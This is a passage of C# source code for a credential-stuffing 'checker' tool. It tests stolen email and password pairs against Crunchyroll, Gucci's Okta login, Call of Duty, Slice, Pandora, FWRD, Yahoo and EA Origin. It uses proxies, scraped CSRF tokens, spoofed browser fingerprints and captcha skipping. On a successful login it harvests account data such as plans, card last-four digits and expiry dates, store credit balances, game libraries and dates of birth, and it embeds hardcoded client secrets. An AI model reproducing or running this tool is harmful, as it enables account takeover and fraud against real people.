                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");

                            string strResponse = req.Post(new Uri("https://api.crunchyroll.com/login.0.json"), new BytesContent(Encoding.Default.GetBytes($"account={email}&password={password}&session_id={sessionId}&locale=enUS&version=1.3.1.0&connectivity_type=ethernet"))).ToString();

                            if (strResponse.Contains("\"access_type\":\""))
                            {
                                JObject jsonObj = (JObject)JsonConvert.DeserializeObject(strResponse);

                                string accessType = jsonObj["data"]["user"]["access_type"].ToString();
                                string plan = jsonObj["data"]["user"]["premium"].ToString();
                                string expires = jsonObj["data"]["expires"].ToString().Split(' ')[0];

                                return $"Type: {accessType} - Plans: {plan} - Expiration Date: {expires}";
                            }
                            break;
                        }
                    }
                    catch
                    {
                        Check.errors++;
                    }
                }
            }
            return "Bad";
        }
        static string CrunchyRollGetSessionId(string guid)
        {
            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");

                        string strResponse = req.Post(new Uri("https://api.crunchyroll.com/start_session.0.json"), new BytesContent(Encoding.Default.GetBytes($"device_type=com.crunchyroll.windows.desktop&device_id={guid}&access_token=LNDJgOit5yaRIWN"))).ToString();
                        if (strResponse.Contains("\"session_id\""))
                        {
                            JObject jsonObj = (JObject)JsonConvert.DeserializeObject(strResponse);

                            return jsonObj["data"]["session_id"].ToString();
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
        }
        #endregion

        #region Wish
        static string WishCheck(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Host", "gucci.okta.com");
                        req.AddHeader("Connection", "keep-alive");
                        req.AddHeader("accept", "application/json");
                        req.AddHeader("x-okta-user-agent-extended", "okta-auth-js-2.13.2");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:81.0) Gecko/20100101 Firefox/81.0");
                        req.AddHeader("content-type", "application/json");
                        req.AddHeader("Origin", "https://www.gucci.com");
                        req.AddHeader("Sec-Fetch-Site", "cross-site");
                        req.AddHeader("Sec-Fetch-Mode", "cors");
                        req.AddHeader("Sec-Fetch-Dest", "empty");
                        req.AddHeader("Referer", "https://www.gucci.com/nl/en_gb/access/view?stateToken=");
                        req.AddHeader("Accept-Language", "en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7");

                        string data = "{\"username\":\"" + email + "\",\"password\":\"" + password + "\"}";
                        HttpResponse res = req.Post(new Uri("https://gucci.okta.com/api/v1/authn"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();

                        if (login.Contains("Authentication failed") || login.Contains("Api validation failed")) return "Bad";
                        else if (login.Contains("status\":\"SUCCESS"))
                        {
                            string country = Parse(login, "\"locale\":\"", "\"");
                            return "Country: " + country;
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }

        #endregion

        #region CallOfDuty
        static string CallOfDutyCheck(string login, string password)
        {
            for (int i = 0; i < Config.retries + 1; i++)
            {
                while (true)
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            CookieStorage cookies = new CookieStorage();
                            string token = CallOfDutyGetCSRF(ref cookies);
                            req.Cookies = cookies;
                            req.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                            req.Referer = "https://profile.callofduty.com/cod/login";

                            HttpResponse res = req.Post(new Uri("https://profile.callofduty.com/do_login?new_SiteId=cod"), new BytesContent(Encoding.Default.GetBytes($"username={login}&remember_me=true&password={password}&_csrf={token}")));
                            string strResponse = res.ToString();

                            if (res.ContainsCookie("atkn"))
                            {
                                string tokenCookie = res.Cookies.GetCookies("https://profile.callofduty.com")["ACT_SSO_COOKIE"].Value;
                                string capture = "";

                                for (int i2 = 0; i2 < Config.retries + 1; i2++)
                                {
                                    capture = CallOfDutyGetCaptures(cookies, tokenCookie);
                                    if (capture != "") break;
                                }

                                if (capture == "")
                                    return $"Working - Capture Failed";

                                return capture;
                            }
                            else if (strResponse.Contains("Captcha error. Please try again.</"))
                            {
                                continue;
                            }
                            break;
                        }
                    }
                    catch
                    {
                        Check.errors++;
                    }
            }
            return "Bad";
        }
        static string CallOfDutyGetCSRF(ref CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        cookies = new CookieStorage();
                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";

                        string strResponse = req.Get(new Uri("https://profile.callofduty.com/cod/login")).ToString();

                        return Regex.Match(strResponse, "name=\"_csrf\" value=\"(.*?)\"").Groups[1].Value;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        static string CallOfDutyGetCaptures(CookieStorage cookies, string tokenCookie)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
                        req.Cookies = cookies;

                        string strResponse = req.Get(new Uri($"https://my.callofduty.com/api/papi-client/crm/cod/v2/identities/{tokenCookie}")).ToString();

                        if (strResponse.Contains("\"platform\":"))
                        {
                            string platform = Regex.Match(strResponse, "\"platform\":([ ]*)\"(.*?)\"").Groups[2].Value;
                            string user = Regex.Match(strResponse, "\"username\":([ ]*)\"(.*?)\"").Groups[2].Value;

                            string strResponse2 = req.Get(new Uri($"https://my.callofduty.com/api/papi-client/stats/cod/v1/title/mw/platform/{platform}/gamer/{user}/profile/type/wz")).ToString();

                            if (strResponse2.Contains("{\"status\":\"success\",\"data\":{\"title\":null,\"platform\":null,\"username\":\"<user>\",\"type\":\"wz\",\"level\":0.0,\"maxLevel\":0.0,\"levelXpRemainder\":0.0,\"levelXpGained\":0.0,\"prestige\":0.0,\"prestigeId\":0.0,\"maxPrestige\":0.0,\"totalXp\":0.0,\"paragonRank\":0.0,\"paragonId\":0.0,\"s\":0.0,\"lifetime\":{\"all\":{\"properties\":null},\"mode\":{},\"map\":{}},\"weekly\":{\"all\":{\"properties\":null},\"mode\":{},\"map\":{}},\"engagement\":null}}"))
                            {
                                return "Free";
                            }

                            string level = Regex.Match(strResponse, "\"level\":([ ]*)\"(.*?)\"").Groups[2].Value;
                            string kills = Regex.Match(strResponse, "\"kills\":([ ]*)\"(.*?)\"").Groups[2].Value;

                            return $"Platform: {platform} - Level: {level} - Kills: {kills}";
                        }
                        else if (strResponse.Contains("{\"status\":\"success\",\"data\":{\"titleIdentities\":[]}}"))
                        {
                            return "Free";
                        }
                        break;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        #endregion

        #region SliceLife

        static string SliceLifeCheck(string login, string password)
        {
            for (int i = 0; i < Config.retries + 1; i++)
            {
                while (true)
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.AddHeader("X-NewRelic-ID", "Ug8EUVFVGwcEV1NXAQQH");
                            req.UserAgent = "MyPizza/202003271051 CFNetwork/1121.2.2 Darwin/19.2.0";

                            HttpResponse res = req.Post(new Uri($"https://coreapi.slicelife.com/oauth/token"), new BytesContent(Encoding.Default.GetBytes($"password={password}&grant_type=password&username={login}")));
                            string strResponse = res.ToString();

                            if (strResponse.Contains("\"access_token\":\""))
                            {
                                string access_token = Regex.Match(strResponse, "\"access_token\":\"(.*?)\"").Groups[1].Value;
                                string captures = "";

                                for (int i2 = 0; i2 < Config.retries + 1; i2++)
                                {
                                    captures = SliceLifeGetCaptures(access_token);
                                    if (captures != "") break;
                                }

                                if (captures == "")
                                    return "Failed Capture";
                                else if (captures == "CC:  - Exp Date: ")
                                    return "Free";

                                return captures;
                            }
                            else if (strResponse.Contains("\"Unauthorized\""))
                            {
                                continue;
                            }
                            return "Bad";
                        }
                    }
                    catch
                    {
                        Check.errors++;
                    }
            }
            return "Bad";
        }
        static string SliceLifeGetCaptures(string token)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Authorization", $"Authorization: bearer {token}");
                        req.AddHeader("If-None-Match", $"W/\"98c458ef2a733afd7d9fbf88e776e5c2\"");
                        req.UserAgent = "MyPizza/202003271051 CFNetwork/1121.2.2 Darwin/19.2.0";

                        HttpResponse res = req.Get(new Uri($"https://coreapi.slicelife.com/api/v1/payment_methods?include_paypal=1"));
                        string strResponse = res.ToString();

                        string cc = "";
                        string exp = "";

                        if (res.StatusCode == HttpStatusCode.OK)
                        {
                            cc = Regex.Match(strResponse, ",\"last_four\":\"(.*?)\"").Groups[1].Value;
                            exp = Regex.Match(strResponse, ",\"expiration_date\":\"(.*?)\"").Groups[1].Value;
                        }

                        return $"CC: {cc} - Exp Date: {exp}";
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        #endregion

        #region Pandora

        static string PandoraCheck(string login, string password)
        {
            for (int i = 0; i < Config.retries + 1; i++)
            {
                while (true)
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            CookieStorage cookies = new CookieStorage();
                            SetBasicRequestSettingsAndProxies(req);
                            string token = PandoraGetCSRF(ref cookies);

                            req.Cookies = cookies;
                            req.AddHeader("cookie", $"csrftoken={token}; _ga=GA1.2.2097708855.1590077941; _gid=GA1.2.1639903843.1590077941; _gat=1; http_referrer=https://www.google.com/; at=wh2G0IS/UfwkPt2K2hW1hJZGRth8AXqJtL2LPnS1QYuw=; lithiumSSO%3Apandora.prod=~2XoLMbbmKeIXhcEvF~eEUwv1Qa4d675XaBmPyOJpSQXkB7zmPHLCasQAoopHjpyvPRHkz1mOo1o_QimjpwL4HTsLwQ3SitYjrCnAui9lBg1YkBhn6PPDPrMNUdr-nSph5cxrbiYrXtqtM1-q1VgKETqanNmo_TLzvZ5ETAUgFAhmQqTnAN38b4sgUpfMP-JITsVwDUwRac7bnvPmQBsyY9pzCkKB2yXBvowE2uVA..");
                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("x-csrftoken", token);
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";
                            req.Referer = "https://www.pandora.com/account/sign-in";

                            HttpResponse res = req.Post(new Uri($"https://www.pandora.com/api/v1/auth/login"), new BytesContent(Encoding.Default.GetBytes("{\"existingAuthToken\":null,\"username\":\"" + login + "\",\"password\":\"" + password + "\",\"keepLoggedIn\":true}")));
                            string strResponse = res.ToString();

                            if (strResponse.Contains("\"authToken\":\""))
                            {
                                string hq = Regex.Match(strResponse, "\"highQualityStreamingEnabled\":\"(.*?)\"").Groups[1].Value;
                                string plan = Regex.Match(strResponse, "\"branding\":\"(.*?)\"").Groups[1].Value;

                                if (plan == "Pandora")
                                    return "Free";

                                return $"Plan: {plan} - High Quality Streaming: {hq}";
                            }
                            else if (strResponse.Contains("\"AUTH_INVALID_USERNAME_PASSWORD\""))
                            {
                                continue;
                            }
                            break;
                        }
                    }
                    catch
                    {
                        Check.errors++;
                    }
            }
            return "Bad";
        }
        static string PandoraGetCSRF(ref CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        cookies = new CookieStorage();
                        req.Cookies = cookies;

                        HttpResponse res = req.Get(new Uri($"https://www.pandora.com/account/sign-in"));

                        return res.Cookies.GetCookies("https://www.pandora.com")["csrftoken"].Value;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        #endregion

        #region FWRD

        static string FWRDCheck(string login, string password)
        {
            for (int i = 0; i < Config.retries + 1; i++)
            {
                while (true)
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            CookieStorage cookies = new CookieStorage();
                            SetBasicRequestSettingsAndProxies(req);

                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                            req.AddHeader("X-Requested-With", "XMLHttpRequest");
                            req.UserAgent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0";
                            req.Referer = "https://www.fwrd.com/fw/Login.jsp?page=https%3A%2F%2Fwww.fwrd.com%2Ffw%2Findex.jsp&sectionURL=Direct+Hit";
                            req.Cookies = cookies;

                            HttpResponse res = req.Post(new Uri($"https://www.fwrd.com/r/ajax/SignIn.jsp"), new BytesContent(Encoding.Default.GetBytes($"email={login}&pw={password}&g_recaptcha_response=&karmir_luys=true&rememberMe=true&isCheckout=true&saveForLater=false&fw=true")));
                            string strResponse = res.ToString();

                            if (strResponse.Contains("success\":true"))
                            {
                                string captures = "";

                                for (int i2 = 0; i2 < Config.retries + 1; i2++)
                                {
                                    captures = FWRDGetCaptures(cookies);
                                    if (captures != "") break;
                                }

                                if (captures == "")
                                    return "Failed Capture";

                                return captures;
                            }
                            break;
                        }
                    }
                    catch
                    {
                        Check.errors++;
                    }
            }
            return "Bad";
        }
        static string FWRDGetCaptures(CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                        req.Cookies = cookies;

                        HttpResponse res = req.Get(new Uri($"https://www.fwrd.com/fw/account/MyCredit.jsp"));
                        string strResponse = res.ToString();

                        string balance = Regex.Match(strResponse, "<p>Your current store credit balance is (.*?)<").Groups[1].Value;
                        if (balance.Contains("0.00")) return "Free";
                        return $"Balance: {balance}";
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        #endregion

        #region Yahoo


        static List<string> YahooUserAgents = new List<string>() { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1", "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" };
        static string Yahoo(string login, string password)
        {
            if (!login.Contains("@yahoo"))
            {
                return "Bad";
            }
            login = System.Web.HttpUtility.UrlEncode(login);
            password = System.Web.HttpUtility.UrlEncode(password);
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        string userAgent = YahooUserAgents[new Random().Next(YahooUserAgents.Count)];
                        CookieStorage cookies = new CookieStorage();
                        SetBasicRequestSettingsAndProxies(req);
                        string[] tokens = YahooGetCSRF(ref cookies, userAgent);

                        req.Cookies = cookies;
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                        req.AddHeader("X-Requested-With", "XMLHttpRequest");
                        req.AddHeader("bucket", "mbr-phoenix-gpst");
                        req.UserAgent = userAgent;
                        req.Referer = "https://login.yahoo.com/";
                        Int32 unixTimestamp = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
                        HttpResponse res = req.Post(new Uri($"https://login.yahoo.com/"), new BytesContent(Encoding.Default.GetBytes($"acrumb={tokens[0]}&sessionIndex={tokens[1]}&username={login}&passwd=&signin=Next&persistent=y&crumb={tokens[2]}&displayName=&browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22FOIEJ%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(NVIDIA%20Quadro%20{new Random().Next(1000, 10000)}%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A49%2C%22hash%22%3A%22411659924ff38420049ac402a30466bc%22%7D%2C%22audio%22%3A%22124.04344884395687%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A{unixTimestamp}385%2C%22render%22%3A{unixTimestamp + 1}591%7D%7D")));
                        string strResponse = res.ToString();

                        if (strResponse.Contains("\"location\""))
                        {
                            string location = Regex.Match(strResponse, "\"location\":\"(.*?)\"").Groups[1].Value;

                            if (location.Contains("recaptcha") || location == "")
                                continue;

                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            HttpResponse res2 = req.Post(new Uri($"https://login.yahoo.com{location}"), new BytesContent(Encoding.Default.GetBytes($"crumb=czI9ivjtMSr&acrumb={tokens[0]}&sessionIndex=QQ--&displayName={login}&passwordContext=normal&password={password}&verifyPassword=Next")));
                            string strResponse2 = res2.ToString();

                            if (strResponse2.Contains("Make sure your account is secure.") || strResponse2.Contains("Sign Out") || strResponse2.Contains("Manage Accounts") || strResponse2.Contains("https://login.yahoo.com/account/logout"))
                            {
                                return $"Hit";
                            }
                            else if (strResponse2.Contains("For your safety, choose a method below"))
                            {
                                return $"2FA";
                            }
                            else if (strResponse2.Contains("Invalid password. Please try again"))
                            {
                                return "Bad";
                            }

                        }
                        else if (strResponse.Contains("\"AUTH_INVALID_USERNAME_PASSWORD\""))
                        {
                            continue;
                        }
                        break;
                    }
                }
                catch
                {
                    Check.errors++;
                }

            return "Bad";
        }
        static string[] YahooGetCSRF(ref CookieStorage cookies, string userAgent)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.UserAgent = userAgent;
                        cookies = new CookieStorage();
                        req.Cookies = cookies;

                        HttpResponse res = req.Get(new Uri($"https://login.yahoo.com/"));
                        string strResponse = res.ToString();

                        return new string[] { Regex.Match(strResponse, "\"acrumb\" value=\"(.*?)\"").Groups[1].Value, Regex.Match(strResponse, "sessionIndex\" value=\"(.*?)\"").Groups[1].Value, Regex.Match(strResponse, "\"crumb\" value=\"(.*?)\"").Groups[1].Value };
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return new string[] { "" };
        }

        #endregion





        private static string origin(string email, string password)
        {
            for (int i = 0; i < 1 + 1; i++)
            {
                for (; ; )
                {
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);
                            HttpResponse httpResponse = req.Get(new Uri("https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834"), null);
                            string uriString = httpResponse["SelfLocation"];
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            string text = req.Post(new Uri(uriString), new BytesContent(Encoding.Default.GetBytes(string.Concat(new string[]
                            {
                            "email=",
                            email,
                            "&password=",
                            password,
                            "&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on"
                            })))).ToString();
                            if (!text.Contains("latestSuccessLogin"))
                            {
                                break;
                            }
                            string value = Regex.Match(text, "fid=(.*?)\"").Groups[1].Value;
                            string text2 = originCapture(value);
                            if (text2 == "No Games")
                            {
                                return "Free";
                            }
                            if (!(text2 == ""))
                            {
                                return text2;
                            }
                            return "Hit";
                        }
                    }
                    catch
                    {
                        Check.errors++;
                    }
                }
            }
            return "Bad";
        }

        private static string originCapture(string string_0)
        {
            string result;
            for (; ; )
            {
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(httpRequest);
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.Referer = "https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834";
                        HttpResponse httpResponse = httpRequest.Get(new Uri("https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=" + string_0), null);
                        string value = Regex.Match(httpResponse["Location"], "code=(.*?)&").Groups[1].Value;
                        httpRequest.UserAgent = "Mozilla/5.0 EA Download Manager Origin/10.5.37.24524";
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        httpRequest.AddHeader("X-Origin-UID", "17524622993368447356");
                        httpRequest.AddHeader("X-Origin-Platform", "PCWIN");
                        string text = httpRequest.Post(new Uri("https://accounts.ea.com/connect/token"), new BytesContent(Encoding.Default.GetBytes("grant_type=authorization_code&code=" + value + "&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html"))).ToString();
                        string text2 = "";
                        if (text.Contains("access_token\""))
                        {
                            JObject jobject = (JObject)JsonConvert.DeserializeObject(text);
                            text2 = jobject["access_token"].ToString();
                        }
                        if (text2 == "")
                        {
                            result = "";
                            break;
                        }
                        httpRequest.Authorization = "Bearer " + text2;
                        string text3 = httpRequest.Get(new Uri("https://gateway.ea.com/proxy/identity/pids/me"), null).ToString();
                        string text4 = "";
                        if (text3.Contains("\"pidId\""))
                        {
                            JObject jobject2 = (JObject)JsonConvert.DeserializeObject(text3);
                            text4 = jobject2["pid"]["pidId"].ToString();
                        }
                        if (text4 == "")
                        {
                            result = "";
                            break;
                        }
                        httpRequest.AddHeader("AuthToken", text2);
                        httpRequest.AddHeader("X-Origin-UID", "17524622993368447356");
                        httpRequest.AddHeader("X-Origin-Platform", "PCWIN");
                        string input = httpRequest.Get(new Uri("https://api1.origin.com/ecommerce2/basegames/" + text4 + "?machine_hash=17524622993368447356"), null).ToString();
                        Match match = Regex.Match(input, "masterTitle=\"(.*?)\"");
                        string text5 = match.Groups[1].Value;
                        match = match.NextMatch();
                        while (match.Success)
                        {
                            text5 = text5 + ", " + match.Groups[1].Value;
                            match = match.NextMatch();
                        }
                        if (text5 == "")
                        {
                            result = "No Games";
                            break;
                        }
                        result = "Games: " + text5;
                        break;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
            return result;
        }


        #region Origin
        public static string originStart(string email, string password)
        {
            for (; ; )
            {
                string acc = email + ":" + password;

                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {

                        SetBasicRequestSettingsAndProxies(req);
                        req.UserAgent = "Mozilla/5.0 EA Download Manager Origin/10.5.45.29542";
                        req.ConnectTimeout = 10000;
                        req.AllowAutoRedirect = true;
                        HttpResponse httpResponse = req.Get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code%20id_token&redirect_uri=qrc:///html/login_successful.html&display=originX/login&locale=en_US&nonce=306&pc_sign=eyJtaWQiOiAiMTUwMDE1NDEwNzE2NzA2Mjc4NzYiLCJic24iOiAiSDhOMENYMTcyOTc0MzQ4IiwibXNuIjogIkJTTjEyMzQ1Njc4OTAxMjM0NTY3IiwiaHNuIjogIkpBMTAwOUQ5MFBLNUJQIiwiZ2lkIjogIjU2NTQiLCJtYWMiOiAiJDAwZmYwMDU5MTY3MiIsInRzIjogIjIwMTktMDgtMjcgMjM6NTk6Mjg6Mjc3IiwiYXYiOiAidjEiLCJzdiI6ICJ2MiJ9.-rfWZCxkeqAO1c3RfmfiyeSc_lkjs1jmhCAOMLANWOY", null);
                        req.IgnoreProtocolErrors = true;
                        string address = httpResponse["SelfLocation"];
                        string text = req.Post(address, string.Concat(new string[]
                                {
                                   "email=",
                                    email,
                                    "&password=",
                                     password,
                                    "&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on"
                        }), "application/x-www-form-urlencoded").ToString();
                        bool flag = text.Contains("latestSuccessLogin");

                        if (flag)
                        {
                            try
                            {
                                Match match = Regex.Match(text, "fid=(.*?)\"");
                                req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.8.0 Chrome/53.0.2785.148 Safari/537.36 EA Download Manager Origin/10.5.37.24524");
                                req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                                req.AddHeader("Host", "accounts.ea.com");
                                req.AddHeader("Connection", "keep-alive");
                                HttpResponse httpResponse2 = req.Get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=" + match.Groups[1].Value, null);
                                string input = httpResponse2["Location"];
                                Match match2 = Regex.Match(input, "code=(.*?)&");
                                req.AddHeader("Host", "signin.ea.com:443");
                                req.AddHeader("Connection", "keep-alive");
                                req.AddHeader("User-Agent", "Mozilla/5.0 EA Download Manager Origin/10.5.45.29542");
                                req.AddHeader("X-Origin-UID", "17524622993368447356");
                                req.AddHeader("X-Origin-Platform", "PCWIN");
                                req.AddHeader("localeInfo", "en_US");
                                req.AddHeader("Accept-Language", "en_US");
                                string input2 = req.Post("https://accounts.ea.com/connect/token", string.Concat(new string[]
                                {
                            "grant_type=authorization_code&code=",
                            match2.Groups[1].Value,
                            "&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html"
                                }), "application/x-www-form-urlencoded").ToString();
                                Match match3 = Regex.Match(input2, "access_token\" : \"(.*?)\"");
                                req.AddHeader("Authorization", "Bearer " + match3.Groups[1].Value);
                                req.AddHeader("X-Include-Underage", "true");
                                req.AddHeader("X-Extended-Pids", "true");
                                string text2 = req.Get("https://gateway.ea.com/proxy/identity/pids/me", null).ToString();
                                Match match4 = Regex.Match(text2, "dob\" : \"(.*?)\"");
                                Match match5 = Regex.Match(text2, "country\" : \"(.*?)\"");
                                Match match6 = Regex.Match(text2, "language\" : \"(.*?)\"");
                                Match match7 = Regex.Match(text2, "pidId\" : (.*?),");
                                Match match8 = Regex.Match(text2, "dateCreated\" : \"(.*?)\"");
                                Match match9 = Regex.Match(text2, "dateModified\" : \"(.*?)\"");
